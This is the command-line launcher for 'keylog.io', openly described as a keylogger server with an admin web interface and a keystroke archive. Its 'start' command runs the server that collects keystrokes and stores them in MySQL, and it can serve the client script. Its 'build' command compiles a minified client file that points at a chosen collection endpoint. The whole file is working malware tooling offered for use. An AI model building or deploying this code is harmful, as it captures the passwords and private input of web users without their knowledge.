#!/usr/bin/env node

const path = require("path");
const program = require('commander');
const defaults = require('./config')
const keyloggerServer = require('./index');
const {
  name,
  version,
  description,
  author
} = require('../package.json');

console.log('\033[2J');
console.log(String.raw`
   _              _                 _
  | |            | |               (_)
  | | _____ _   _| | ___   __ _     _  ___
  | |/ / _ \ | | | |/ _ \ / _  |   | |/ _ \
  |   <  __/ |_| | | (_) | (_| | _ | | (_) |
  |_|\_\___|\__, |_|\___/ \__, |(_)|_|\___/
             __/ |         __/ |
            |___/         |___/

  v${version} by ${author}

  A express/socket.io based keylogger server
  with a administrator web interface and archive.

`);

program
  .name(defaults.name)
  .version(version);

// Start the keylog.io server
program
  .command('start')
  .description('Start the keylogger server')
  .option('-h, --hostname <host>', 'The address where start the server', defaults.hostname)
  .option('-p, --port <port>', 'The port where start the server', defaults.port)
  .option('-c, --client', 'Serve the client keylogger file', defaults.serveClient)
  .option('-d, --demo', 'Serve the demo client page', defaults.serveDemo)
  .option('--db-host <address>', 'The MySQL database hostname')
  .option('--db-port <port>', 'The MySQL database port', defaults.database.port)
  .option('--db-name <name>', 'The database name', defaults.database.name)
  .option('--db-user <value>', 'The database user name', defaults.database.username)
  .option('--db-pass <value>', 'The database user password', defaults.database.password)
  .action(options => {
    keyloggerServer({
      serveDemo: options.demo,
      serveClient: options.client,
      hostname: options.hostname,
      port: options.port,
      database: {
        name: options.dbName,
        hostname: options.dbHost,
        port: options.dbPort,
        username: options.dbUser,
        password: options.dbPass
      }
    });
  })

// Build keylogger client file for given endpoint
program
  .command('build <hostname> [port]')
  .description('Build the client flle for the given endpoint')
  .option('-o, --output <path>', 'Where to save the output file', './')
  .action((hostname, port, options) => {
    const webpack = require("webpack");

    let endpoint = port ? `${hostname}:${port}` : hostname
    let webpackConfig = require(path.resolve(__dirname, '../lib/webpack.config.js'))

    // Override default config
    webpackConfig.output.path = path.resolve(options.output)
    webpackConfig.output.filename = 'client.min.js'
    webpackConfig.plugins.unshift(new webpack.DefinePlugin({
      SERVER_URL: JSON.stringify(endpoint)
    }))

    console.log('Building client file for:', endpoint, 'endpoint.', '\n');
    webpack(webpackConfig, (err, stats) => {
      if (err) {
        console.error(err.stack || err);
        if (err.details) {
          console.error(err.details);
        }
        return;
      }

      const info = stats.toJson();

      if (stats.hasErrors()) {
        console.error(info.errors);
      }

      if (stats.hasWarnings()) {
        console.warn(info.warnings);
      }

      console.log(stats.toString({
        chunks: false,
        colors: true
      }), '\n')

      console.log('Output saved to:', path.join(webpackConfig.output.path, webpackConfig.output.filename));
    })
  })

program.parse(process.argv);
